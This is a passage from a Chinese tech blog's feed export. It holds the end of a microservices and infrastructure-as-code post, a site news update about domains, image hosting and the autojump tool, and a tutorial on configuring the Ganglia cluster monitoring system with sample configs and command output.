<h3 id="Infrastructure-as-Code-基础设施即代码"><a href="#Infrastructure-as-Code-基础设施即代码" class="headerlink" title="Infrastructure as Code(基础设施即代码)"></a>Infrastructure as Code(基础设施即代码)</h3><blockquote>
<p>The enabling idea of infrastructure as code is that the systems and devices which are used to run software can be treated as if they, themselves, are software. — Kief Morris</p>
</blockquote>
<p>云带来的好的一方面是它让公司中的任何人都可以轻松部署、配置和管理他们需要的基础设施。虽然很多基础设施团队采用了云和自动化技术，却没有采用相应的自动化测试和发布流程。它们把这些当作一门过于复杂的脚本语言来使用。他们会为每一次具体的改动编写手册、配置文件和执行脚本，再针对一部分指定的服务器手工运行它们，也就是说每一次改动都还需要花费专业知识、时间和精力。这种工作方式意味着基础设施团队没有把他们自己从日常的重复性劳动中解放出来。目前已经有很多商业云平台提供了Docker服务，只需要将自己的 <strong>git repository</strong> 链接到平台，即可以自动帮你完成部署，在云上完成集成测试。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/MicroService_UseDocker.jpg" alt=""></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose run app ginkgo</span><br></pre></td></tr></table></figure>
<p><img src="http://riboseyim-qiniu.riboseyim.com/MicroService_CloudTest.png" alt=""></p>
<h2 id="扩展阅读：开源架构技术漫谈"><a href="#扩展阅读：开源架构技术漫谈" class="headerlink" title="扩展阅读：开源架构技术漫谈"></a>扩展阅读：开源架构技术漫谈</h2><ul>
<li><a href="https://riboseyim.github.io/2017/07/23/CloudComputing/">Stack Overflow：2017年最赚钱的编程语言</a></li>
<li><a href="https://riboseyim.github.io/2018/04/27/DevOps-OpenCensus">DevOps 漫谈：基于OpenCensus构建分布式跟踪系统</a></li>
<li><a href="https://riboseyim.github.io/2017/05/23/RestfulAPI/">基于Go语言快速构建一个RESTful API服务</a></li>
<li><a href="https://riboseyim.github.io/2017/06/12/OpenSource-Kafka-Microservice/">基于Kafka构建事件溯源型微服务</a></li>
<li><a href="https://riboseyim.github.io/2017/10/30/Protocol-gRPC/">远程通信协议：从 CORBA 到 gRPC</a></li>
<li><a href="https://riboseyim.github.io/2017/05/24/Log/">应用程序开发中的日志管理(Go语言描述)</a></li>
<li><a href="https://riboseyim.github.io/2017/12/04/Visualization-Graphite/">数据可视化（七）Graphite 体系结构详解</a></li>
<li><a href="https://riboseyim.github.io/2016/11/26/DTrace/">动态追踪技术(一)：DTrace 导论</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5MTY1MjQ3Nw==&amp;mid=2651939588&amp;idx=1&amp;sn=35f71c5f88d1edf23cb2efc812ab8e6c&amp;chksm=bd578c168a20050041c08618281691f0111f61c789097a69095933057618637fc54817815921#rd">动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 </a></li>
<li><a href="https://riboseyim.github.io/2017/04/17/DTrace_FTrace/">动态追踪技术(三)：Tracing Your Kernel Function!</a></li>
<li><a href="https://riboseyim.github.io/2017/06/27/DTrace_bcc/">动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪</a></li>
<li><a href="https://riboseyim.github.io/2018/02/16/DTrace-Linux/">动态追踪技术(五)：Welcome DTrace for Linux</a></li>
<li><a href="https://riboseyim.github.io/2016/08/15/OpenSource-Kafka/">DevOps 资讯 | LinkedIn 开源 Kafka Monitor</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><h4 id="Theory"><a href="#Theory" class="headerlink" title="Theory"></a>Theory</h4><ul>
<li><a href="http://www.melconway.com/Home/Conways_Law.html">康威定律</a></li>
<li><a href="http://www.infoq.com/cn/presentations/team-building-implementation-in-distributed-world">Mike Amundsen 《远距离条件下的康威定律——分布式世界中实现团队构建》</a></li>
<li><a href="http://shop.oreilly.com/product/0636920039297.do">Kief Morris《Infrastructure as Code - Managing Servers in the Cloud》</a></li>
<li><a href="http://www.infoq.com/cn/articles/book-infrastructure-as-code">InfoQ:《Infrastructure as Code》书评与摘要</a><h4 id="Microservices"><a href="#Microservices" class="headerlink" title="Microservices"></a>Microservices</h4></li>
<li><a href="https://martinfowler.com/articles/microservices.html">(推荐)Martin Fowler : Microservices</a></li>
<li><a href="http://dockone.io/article/2133">李颖杰：为什么要重构到微服务（案例）</a></li>
<li><a href="https://outcrawl.com/go-graphql-gateway-microservices/">Using GraphQL with Microservices in Go</a></li>
</ul>
<h4 id="Event-Sourcing"><a href="#Event-Sourcing" class="headerlink" title="Event Sourcing"></a>Event Sourcing</h4><ul>
<li><a href="https://semaphoreci.com/community/tutorials/writing-and-testing-an-event-sourcing-microservice-with-kafka-and-go">(推荐) Writing and Testing an Event Sourcing Microservice with Kafka and Go</a></li>
<li><a href="https://www.linkedin.com/in/adampahlevi/">Linkedin Profile:Adam Pahlevi Baihaqi</a></li>
<li><a href="https://medium.com/technology-learning/event-sourcing-and-cqrs-a-look-at-kafka-e0c1b90d17d8">(推荐) OKONKWO VINCENT IKEM:Building Scalable Applications Using Event Sourcing and CQRS</a></li>
<li><a href="https://docs.microsoft.com/en-us/azure/architecture/patterns/event-sourcing">(推荐)Microsoft Azure:Event Sourcing</a></li>
<li><a href="http://agiledon.github.io/blog/2012/12/31/basic-understanding-on-cqrs/">张逸:对CQRS的基础理解</a></li>
<li><a href="http://www.cnblogs.com/netfocus/archive/2011/10/10/2204949.html">汤雪华：领域驱动设计之领域模型</a></li>
<li><a href="http://www.cnblogs.com/netfocus/archive/2012/02/12/2347911.html">汤雪华：什么是事件溯源（Event Sourcing）</a></li>
<li><a href="https://www.infoq.com/news/2016/04/event-sourcing-anti-pattern">InfoQ:A Whole System Based on Event Sourcing is an Anti-Pattern</a><h4 id="Zookeeper-amp-Kafka"><a href="#Zookeeper-amp-Kafka" class="headerlink" title="Zookeeper &amp; Kafka"></a>Zookeeper &amp; Kafka</h4></li>
<li><a href="https://kafka.apache.org/quickstart">Kafka QuickStart</a></li>
<li><a href="https://cwiki.apache.org/confluence/display/KAFKA/Kafka+0.9+Consumer+Rewrite+Design">Apache.org:Kafka 0.9 Consumer Rewrite Design</a></li>
<li><a href="https://www.quora.com/What-is-the-actual-role-of-ZooKeeper-in-Kafka">Quora:What is the actual role of ZooKeeper in Kafka?</a></li>
<li><a href="http://grokbase.com/t/kafka/users/135mk77x9q/relationship-between-zookeeper-and-kafka">grokbase:Relationship between Zookeeper and Kafka</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzA3MjEyNTE4MQ==&amp;mid=403459151&amp;idx=1&amp;sn=640ba3d9ea70e23ace8b99aff764e42f&amp;scene=1&amp;srcid=01050dYirNIOQVUTLyiBw1j6#rd">朱赟:白话 IT 之要不要从 rabbitMQ 转 kafka？</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>SRE</tag>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>OpenSource</tag>
        <tag>Engineering</tag>
        <tag>Developer</tag>
        <tag>Golang</tag>
        <tag>Database</tag>
      </tags>
  </entry>
  <entry>
    <title>Night News 20181201</title>
    <url>/2018/12/01/News-Night-20181201/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>上线新域名：riboseyim.com</li>
<li>恢复:七牛云图床故障</li>
<li>发布:写作工具链v5</li>
<li>推荐工具:AutoJump<span id="more"></span>
</li>
</ul>
<h2 id="上线一个纯洁的域名"><a href="#上线一个纯洁的域名" class="headerlink" title="上线一个纯洁的域名"></a>上线一个纯洁的域名</h2><h4 id="新域名"><a href="#新域名" class="headerlink" title="新域名"></a>新域名</h4><ul>
<li>解决七牛云“测试”域名回收导致的图床故障</li>
<li>提高墙内用户的访问速度和稳定性</li>
</ul>
<h2 id="https-riboseyim-com"><a href="#https-riboseyim-com" class="headerlink" title="https://riboseyim.com"></a><a href="https://riboseyim.com">https://riboseyim.com</a></h2><h4 id="恢复：七牛云图床故障"><a href="#恢复：七牛云图床故障" class="headerlink" title="恢复：七牛云图床故障"></a>恢复：七牛云图床故障</h4><p>以下图床域名统一更新为：<a href="http://riboseyim-qiniu.riboseyim.com">http://riboseyim-qiniu.riboseyim.com</a> 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://o8m8ngokc.bkt.clouddn.com</span><br><span class="line">http://og2061b3n.bkt.clouddn.com</span><br><span class="line">http://ogtqvs10n.bkt.clouddn.com</span><br><span class="line">http://okkuj60pj.bkt.clouddn.com</span><br><span class="line">http://omaxozji3.bkt.clouddn.com</span><br><span class="line">http://omb2onfvy.bkt.clouddn.com</span><br><span class="line">http://ombx24fbq.bkt.clouddn.com</span><br><span class="line">http://osgiyhxhy.bkt.clouddn.com</span><br><span class="line">http://ot6idm48o.bkt.clouddn.com</span><br><span class="line">http://p11slcnom.bkt.clouddn.com</span><br></pre></td></tr></table></figure>
<h4 id="发布：写作工具链v5"><a href="#发布：写作工具链v5" class="headerlink" title="发布：写作工具链v5"></a>发布：写作工具链v5</h4><p><img src="http://riboseyim-qiniu.riboseyim.com/Writer_Tools_Chain_5.png" alt=""></p>
<ul>
<li>add 独立域名 <a href="https://riboseyim.com">https://riboseyim.com</a> [Ribose Yim’s Tech Blog] 【腾讯云】</li>
<li>故障修复：图床域名更换 xxx.clouddn.com to <a href="http://riboseyim-qiniu.riboseyim.com">http://riboseyim-qiniu.riboseyim.com</a> 【七牛云】</li>
<li>add hexo theme <a href="https://github.com/giscafer/hexo-theme-cafe">Cafe</a></li>
<li>auto syn workflow: from riboseyim.github.io to project riboseyim.com</li>
<li>add Xmind replace MindManager,201807</li>
<li>更多细节请查看 <a href="https://riboseyim.github.io/2017/06/03/Writing-WriterToolChain/">《我的写作工具链》</a></li>
</ul>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 主题</span></span><br><span class="line">$ git clone https:<span class="regexp">//gi</span>thub.com/giscafer/hexo-theme-cafe.git themes/cafe</span><br><span class="line"></span><br><span class="line"><span class="comment"># 素材链接替换</span></span><br><span class="line">$ <span class="keyword">grep</span> <span class="string">&#x27;clouddn.com&#x27;</span> ./*.md | awk -F <span class="string">&#x27;(&#x27;</span> <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | awk -F <span class="string">&#x27;.com&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> &gt; oldomain.log</span><br><span class="line">$ <span class="keyword">sort</span> -n oldomain.log  | uniq &gt; oldomin.list</span><br><span class="line">$ gsed -e <span class="string">&quot;s/old/new/g&quot;</span> sourcefile  &gt;  targetfile</span><br></pre></td></tr></table></figure>
<h4 id="推荐工具-AutoJump"><a href="#推荐工具-AutoJump" class="headerlink" title="推荐工具:AutoJump"></a>推荐工具:AutoJump</h4><p>autojump 记录你访问过的文件夹（包括记录访问频率进而调整权重），通过路径 cache 实现文件夹位置快速切换。<br>了解更多细节请查看 <a href="https://riboseyim.com/2018/09/03/Linux-Commands-New/">DevOps 资讯 | 是时候升级你的命令行了</a></p>
<ul>
<li>Install</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># source</span></span><br><span class="line">git <span class="built_in">clone</span> git://github.com/wting/autojump.git</span><br><span class="line"><span class="built_in">cd</span> autojump</span><br><span class="line">./install.py or ./uninstall.py</span><br></pre></td></tr></table></figure>
<ul>
<li>Example</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aca80164:~ kurui$ j -s</span><br><span class="line">10.0:	/Users/yanrui/project/riboseyim.com</span><br><span class="line">50.0:	/Users/yanrui/project-third/autojump</span><br><span class="line">50.0:	/Users/yanrui/project/riboseyim.github.io/source/_posts</span><br><span class="line">________________________________________</span><br><span class="line"></span><br><span class="line">109:	 total weight</span><br><span class="line">3:	 number of entries</span><br><span class="line">0.00:	 current directory weight</span><br><span class="line"></span><br><span class="line">data:	 /Users/yanrui/Library/autojump/autojump.txt</span><br><span class="line">aca80164:~ kurui$</span><br><span class="line">aca80164:~ kurui$ cd project/ebook-linuxperfmaster/</span><br><span class="line">aca80164:ebook-linuxperfmaster kurui$ j -s</span><br><span class="line">10.0:	/Users/yanrui/project/riboseyim.com</span><br><span class="line">14.1:	/Users/yanrui/project/ebook-linuxperfmaster</span><br><span class="line">50.0:	/Users/yanrui/project-third/autojump</span><br><span class="line">50.0:	/Users/yanrui/project/riboseyim.github.io/source/_posts</span><br><span class="line">________________________________________</span><br><span class="line"></span><br><span class="line">124:	 total weight</span><br><span class="line">4:	 number of entries</span><br><span class="line">14.14:	 current directory weight</span><br><span class="line"></span><br><span class="line">data:	 /Users/yanrui/Library/autojump/autojump.txt</span><br><span class="line">aca80164:ebook-linuxperfmaster kurui$</span><br><span class="line">aca80164:ebook-linuxperfmaster kurui$ j post</span><br><span class="line">/Users/yanrui/project/riboseyim.github.io/source/_posts</span><br><span class="line">aca80164:_posts kurui$ pwd</span><br><span class="line">/Users/yanrui/project/riboseyim.github.io/source/_posts</span><br><span class="line">aca80164:_posts kurui$ j -s</span><br><span class="line">10.0:	/Users/yanrui/project/riboseyim.com</span><br><span class="line">22.4:	/Users/yanrui/project/ebook-linuxperfmaster</span><br><span class="line">50.0:	/Users/yanrui/project-third/autojump</span><br><span class="line">52.0:	/Users/yanrui/project/riboseyim.github.io/source/_posts</span><br><span class="line">________________________________________</span><br><span class="line"></span><br><span class="line">134:	 total weight</span><br><span class="line">4:	 number of entries</span><br><span class="line">51.96:	 current directory weight</span><br><span class="line"></span><br><span class="line">data:	 /Users/yanrui/Library/autojump/autojump.txt</span><br><span class="line">aca80164:_posts kurui$</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>News</tag>
      </tags>
  </entry>
  <entry>
    <title>开源技术架构漫谈:基于 Ganglia 实现集群性能态势感知</title>
    <url>/2016/11/04/OpenSource-Ganglia/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>本文以开源项目Ganglia为例，介绍多集群环境下，利用监控系统进行故障诊断、性能瓶颈分析的一般方法。</p>
<span id="more"></span>
<h4 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h4><p>通过前面的发布过的两篇文章，我们已经大致掌握了描述单个服务器的性能情况的方法。可以从load avgerage等总括性的数据着手，获得系统资源利用率（CPU、内存、I/O、网络）和进程运行情况的整体概念。参考CPU使用率和I/O等待时间等具体的数字，从而自顶向下快速排查各进程状态。也可以在60秒内，通过运行以下10个基本命令，判断是否存在异常、评估饱和度，度量请求队列长度等等。</p>
<p><a href="http://www.jianshu.com/p/db8e8a2884ef">1.基于Linux单机的负载评估</a></p>
<p><a href="http://www.jianshu.com/p/fd6e35f529c1">2.Netflix性能分析模型：In 60 Seconds</a></p>
<p>在真实的工程实践中，并不能总是通过几行简单的命令，直接获得性能问题的答案。一般不会存在一台单独运行的服务器，它们一定属于某个服务集群之中，就算是同一集群的服务器，也可能属于不同建设周期、硬件配置不同、分工角色不同。或者由不同机房、不通集群的服务器共同协作完成任务。</p>
<p>另外，很多性能问题也需要长时间的追踪、对比才能作出判断。正如任何一个高明的医生，都需要尽可能多地了解、记录病人的病史，不掌握这些情况，盲目下药，无异于庸医杀人。诚如医者曰：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">夫经方之难精，由来尚矣。今病有内同而外异，亦有内异而外，</span><br><span class="line">故五脏六腑之盈虚，血脉荣卫之通塞，固非耳目之所察，</span><br><span class="line">必先诊候以审之。世有愚者，读方三年，便谓天下无病可治；</span><br><span class="line">及治病三年，乃知天下无方可用。</span><br></pre></td></tr></table></figure>
<p>基于 Ganglia 项目我们可以快速搭建一套高性能的监控系统，展开故障诊断分析、资源扩容预算甚至故障预测。</p>
<h4 id="Ganglia框架简析"><a href="#Ganglia框架简析" class="headerlink" title="Ganglia框架简析"></a>Ganglia框架简析</h4><p><img src="http://riboseyim-qiniu.riboseyim.com/Ganglia_Arch_Top.png" alt=""></p>
<!--more-->
<p>一般应用中，需要用到两个核心组件：</p>
<p><strong>Gmond （Ganglia Monitoring Daemon）</strong><br>Gmond承担双重角色：1、作为Agent，部署在所有需要监控的服务器上。<br>2、作为收发机，接收或转发数据包。</p>
<p><strong>Gmetad (Ganglia Meta Daemon)</strong><br>负责收集所在集群的数据，并持久化到RRD数据库。根据集群的组网情况，可以部署1-N个。</p>
<p><strong>Web frontend</strong><br>Ganglia项目提供一个PHP编写的通用型的Web包，主要实现数据可视化，能提供一些简单的数据筛选UI。页面不多，大量使用了模版技术。HTTP Server方面，用Apache和Nginx都可以。</p>
<p><strong>RRDTool (Round Robin Database)</strong><br>Gmetad收集的时间序列数据都通过RRD存储，RRDTool作为绘图引擎使用。</p>
<p><strong>插件生态</strong><br>Ganglia最重要的特性之一就是提供了一个灵活的数据标准和插件API。<br>它使得我们可以根据系统的情况，很容易地在默认的监控指标集之上，引用或定制其他扩展指标。<br>这一特性在大数据领域也获得了认可，Hadoop,Spark等都开放了面向Ganglia的指标集。<br>在Github上也有很多现成的扩展插件。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Ganglia_Install.png" alt=""></p>
<h4 id="Ganglia工作模式"><a href="#Ganglia工作模式" class="headerlink" title="Ganglia工作模式"></a>Ganglia工作模式</h4><p>项目的名称其实已经反映了作者的设计思路。<br>Ganglia（又作：ganglion）,直译为“神经节”、“中枢神经”。在解剖学上是一个生物组织丛集，通常是神经细胞体的集合。在神经学中，神经节主要是由核周体和附随连结的树突组合而成。神经节经常与其他神经节相互连接以形成一个复杂的神经节系统。神经节提供了身体内不同神经体系之间的依靠点和中介连结，例如周围神经系统和中枢神经系统。</p>
<p>Ganglia的作者意图将服务器集群理解为生物神经系统，每台服务器都是独立工作神经节，通过多层次树突结构连接起来，<br>既可以横向联合，也可以从低向高，逐层传递信息。具体例证就是Ganglia的收集数据工作可以工作在单播（unicast)或多播(multicast)模式下，<br>默认为多播模式。</p>
<p>单播：Gmond收集到的监控数据发送到特定的一台或几台机器上，可以跨网段</p>
<p>多播：Gmond收集到的监控数据发送到同一网段内所有的机器上，同时收集同一网段内的所有机器发送过来的监控数据。<br>因为是以广播包的形式发送，因此需要同一网段内。但同一网段内，又可以定义不同的发送通道。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Ganglia_Arch_Impl.png" alt=""></p>
<p>vi /usr/local/ganglia/etc/gmond.conf</p>
<p><strong>默认配置：</strong><br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cluster &#123;</span><br><span class="line">  name = &quot;cluster01&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">udp_send_channel &#123;</span><br><span class="line">  mcast_join = 239.2.11.71</span><br><span class="line">  port = 8649</span><br><span class="line">  ttl = 1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">udp_recv_channel &#123;</span><br><span class="line">  mcast_join = 239.2.11.71</span><br><span class="line">  port = 8649</span><br><span class="line">  bind = 239.2.11.71</span><br><span class="line">  retry_bind = true</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tcp_accept_channel &#123;</span><br><span class="line">  port = 8649</span><br><span class="line">  gzip_output = no</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><strong>单播模式Gmetad增加配置：</strong><br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">udp_recv_channel &#123;</span><br><span class="line">  port = 8666</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><strong>单播模式Gmond增加配置：</strong><br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">udp_send_channel &#123;</span><br><span class="line">  host = 192.168.0.39</span><br><span class="line">  port = 8666</span><br><span class="line">  ttl = 1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><strong>默认装载指标集：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">modules &#123;</span><br><span class="line">  module &#123;</span><br><span class="line">    name = &quot;core_metrics&quot;</span><br><span class="line">  &#125;</span><br><span class="line">  module &#123;</span><br><span class="line">    name = &quot;cpu_module&quot;</span><br><span class="line">    path = &quot;modcpu.so&quot;</span><br><span class="line">  &#125;</span><br><span class="line">  module &#123;</span><br><span class="line">    name = &quot;disk_module&quot;</span><br><span class="line">    path = &quot;moddisk.so&quot;</span><br><span class="line">  &#125;</span><br><span class="line">  module &#123;</span><br><span class="line">    name = &quot;load_module&quot;</span><br><span class="line">    path = &quot;modload.so&quot;</span><br><span class="line">  &#125;</span><br><span class="line">  module &#123;</span><br><span class="line">    name = &quot;mem_module&quot;</span><br><span class="line">    path = &quot;modmem.so&quot;</span><br><span class="line">  &#125;</span><br><span class="line">  module &#123;</span><br><span class="line">    name = &quot;net_module&quot;</span><br><span class="line">    path = &quot;modnet.so&quot;</span><br><span class="line">  &#125;</span><br><span class="line">  module &#123;</span><br><span class="line">    name = &quot;proc_module&quot;</span><br><span class="line">    path = &quot;modproc.so&quot;</span><br><span class="line">  &#125;</span><br><span class="line">  module &#123;</span><br><span class="line">    name = &quot;sys_module&quot;</span><br><span class="line">    path = &quot;modsys.so&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>vi /usr/local/ganglia/etc/gmetad.conf</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">### 配置数据源，可以多个</span><br><span class="line">data_source &quot;cluster01&quot; localhost:8649   </span><br><span class="line">data_source &quot;cluster02&quot;  192.168.0.39:8666 192.168.0.48:8666</span><br><span class="line"></span><br><span class="line">gridname &quot;mygrid&quot;</span><br><span class="line"></span><br><span class="line">### 指定RRD数据路径</span><br><span class="line">rrd_rootdir &quot;/home/data/ganglia/rrds&quot;</span><br></pre></td></tr></table></figure>
<h4 id="查看数据流向"><a href="#查看数据流向" class="headerlink" title="查看数据流向"></a>查看数据流向</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># netstat -an | grep 86     </span><br><span class="line">tcp        0      0 0.0.0.0:8649         0.0.0.0:*           LISTEN      ##tcp_accept_channel</span><br><span class="line">udp        0      0 192.168.0.45:52745   239.2.11.71:8649    ESTABLISHED  ##组播</span><br><span class="line">udp        0      0 239.2.11.71:8649     0.0.0.0:*                               </span><br><span class="line">udp        0      0 0.0.0.0:8666         0.0.0.0:*    ##udp_recv_channel</span><br></pre></td></tr></table></figure>
<p>Gmetad所在位置，已经可以收到监控数据的服务器列表：<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># telnet localhost 8649 | grep HOST</span><br><span class="line">&lt;HOST NAME=&quot;192.168.0.56&quot; IP=&quot;192.168.0.56&quot; TAGS=&quot;&quot; REPORTED=&quot;1478226772&quot; TN=&quot;6&quot; TMAX=&quot;20&quot; DMAX=&quot;86400&quot; LOCATION=&quot;GZ&quot; GMOND_STARTED=&quot;1477817579&quot;&gt;</span><br><span class="line">&lt;/HOST&gt;</span><br><span class="line">&lt;HOST NAME=&quot;192.168.0.39&quot; IP=&quot;192.168.0.39&quot; TAGS=&quot;&quot; REPORTED=&quot;1478226771&quot; TN=&quot;7&quot; TMAX=&quot;20&quot; DMAX=&quot;86400&quot; LOCATION=&quot;GZ&quot; GMOND_STARTED=&quot;1477473541&quot;&gt;</span><br><span class="line">......</span><br></pre></td></tr></table></figure></p>
<p>Gmond所在位置，收到的监控指标数据明细：<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># telnet localhost 8649 | grep cpu_idle</span><br><span class="line">telnet: connect to address ::1: Connection refused</span><br><span class="line">&lt;METRIC NAME=&quot;cpu_idle&quot; VAL=&quot;96.7&quot; TYPE=&quot;float&quot; UNITS=&quot;%&quot; TN=&quot;33&quot; TMAX=&quot;90&quot; DMAX=&quot;0&quot; SLOPE=&quot;both&quot;&gt;</span><br><span class="line">&lt;METRIC NAME=&quot;cpu_idle&quot; VAL=&quot;100.0&quot; TYPE=&quot;float&quot; UNITS=&quot;%&quot; TN=&quot;20&quot; TMAX=&quot;90&quot; DMAX=&quot;0&quot; SLOPE=&quot;both&quot;&gt;</span><br><span class="line">&lt;METRIC NAME=&quot;cpu_idle&quot; VAL=&quot;91.2&quot; TYPE=&quot;float&quot; UNITS=&quot;%&quot; TN=&quot;4&quot; TMAX=&quot;90&quot; DMAX=&quot;0&quot; SLOPE=&quot;both&quot;&gt;</span><br><span class="line">&lt;METRIC NAME=&quot;cpu_idle&quot; VAL=&quot;96.3&quot; TYPE=&quot;float&quot; UNITS=&quot;%&quot; TN=&quot;28&quot; TMAX=&quot;90&quot; DMAX=&quot;0&quot; SLOPE=&quot;both&quot;&gt;</span><br><span class="line">&lt;METRIC NAME=&quot;cpu_idle&quot; VAL=&quot;99.9&quot; TYPE=&quot;float&quot; UNITS=&quot;%&quot; TN=&quot;5&quot; TMAX=&quot;90&quot; DMAX=&quot;0&quot; SLOPE=&quot;both&quot;&gt;</span><br><span class="line">&lt;METRIC NAME=&quot;cpu_idle&quot; VAL=&quot;83.9&quot; TYPE=&quot;float&quot; UNITS=&quot;%&quot; TN=&quot;14&quot; TMAX=&quot;90&quot; DMAX=&quot;0&quot; SLOPE=&quot;both&quot;&gt;</span><br><span class="line">&lt;METRIC NAME=&quot;cpu_idle&quot; VAL=&quot;84.2&quot; TYPE=&quot;float&quot; UNITS=&quot;%&quot; TN=&quot;0&quot; TMAX=&quot;90&quot; DMAX=&quot;0&quot; SLOPE=&quot;both&quot;&gt;</span><br><span class="line">&lt;METRIC NAME=&quot;cpu_idle&quot; VAL=&quot;44.1&quot; TYPE=&quot;float&quot; UNITS=&quot;%&quot; TN=&quot;9&quot; TMAX=&quot;90&quot; DMAX=&quot;0&quot; SLOPE=&quot;both&quot;&gt;</span><br><span class="line">......</span><br></pre></td></tr></table></figure></p>
<h3 id="数据可视化"><a href="#数据可视化" class="headerlink" title="数据可视化"></a>数据可视化</h3><p><img src="http://riboseyim-qiniu.riboseyim.com/Ganglia-Demo-1.png" alt="集群视图"></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Ganglia-Demo-2.png" alt="一级视图"></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Ganglia-Demo-3.png" alt="二级视图"></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Ganglia-Demo-4.png" alt="主机视图"></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Ganglia-Demo-5.png" alt="多机横向对比"></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Ganglia-Demo-6.png" alt="多机横向对比"></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Ganglia-Nginx.jpg" alt="Nginx监控扩展插件"></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Ganglia-Demo-CPU.png" alt="CPU密集型特征"></p>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">没有任何一个开源项目是完美的。</span><br></pre></td></tr></table></figure>
<p>1、告警流程框架：Ganglia本身并不具备，可以选用 Nagios 补充。<br><a href="https://www.ibm.com/developerworks/library/l-ganglia-nagios-1/">https://www.ibm.com/developerworks/library/l-ganglia-nagios-1/</a><br><a href="https://www.quora.com/Ganglia-vs-collectd-vs-cacti-advantage-and-disadvantage">https://www.quora.com/Ganglia-vs-collectd-vs-cacti-advantage-and-disadvantage</a></p>
<p>2、日志管理框架：Ganglia本身并不具备，可以选用 Splunk 补充。</p>
<p>3、性能开销预算</p>
<p>对于单纯的Gmond节点来说，性能开销很低。主要的瓶颈在中央节点。<br><img src="http://riboseyim-qiniu.riboseyim.com/Ganglia_Perf_Test.png" alt=""></p>
<p>各节点的gmond进程向中央节点发送的udp数据带来的网络开销。如果一个节点每秒发10个包，<br>1000个节点将会发出10000个，每个包有200字节，就有2m字节，10000个包的处理所需要的cpu使用也会上升。</p>
<p>Gmetad默认15秒向gmond取一次xml数据,解析xml文件带来的CPU负荷也会随着管理节点数线性增长。</p>
<p>格外需要注意的是RRD的写入瓶颈。实际应用中需要根据资源情况，调整采样频率、权衡指标数量、引入RRDCached等方式优化。</p>
<p>4、网络流向监控：Ganglia原生支持sFlow<br>GitHub:gmond-proxy project。what are some of the benefits of using the proxy?</p>
<p>   Firstly, the proxy allows metrics to be filtered, reducing the amount of data logged and increasing the scaleability of the Ganglia collector.</p>
<p>   Secondly, sFlow-RT generates traffic flow metrics, making them available to Ganglia.</p>
<p>   Finally, Ganglia is typically used in conjunction with additional monitoring tools that can all be driven using the analytics stream generated by sFlow-RT.</p>
<p>   <img src="http://riboseyim-qiniu.riboseyim.com/Ganglia-sFlow.jpg" alt=""></p>
<p>5、可视化</p>
<ul>
<li><a href="https://riboseyim.github.io/2017/11/23/Visualization-DashBoard/">数据可视化（六）常见的数据可视化仪表盘(DashBoard)</a></li>
<li><a href="https://riboseyim.github.io/2017/12/04/Visualization-Graphite/">数据可视化（七）Graphite 体系结构详解</a></li>
</ul>
<h4 id="Ganglia-Develop-Team"><a href="#Ganglia-Develop-Team" class="headerlink" title="Ganglia Develop Team"></a>Ganglia Develop Team</h4><ul>
<li><a href="https://www.linkedin.com/in/mattmassie">Matt Massie</a>:UCB</li>
<li><a href="https://www.linkedin.com/in/brentchun">Brent Chun</a>:Developer,UCB</li>
<li><a href="https://www2.eecs.berkeley.edu/Faculty/Homepages/culler.html">David E. Culler</a>:Professor</li>
</ul>
<h2 id="读者讨论区"><a href="#读者讨论区" class="headerlink" title="读者讨论区"></a>读者讨论区</h2><ol>
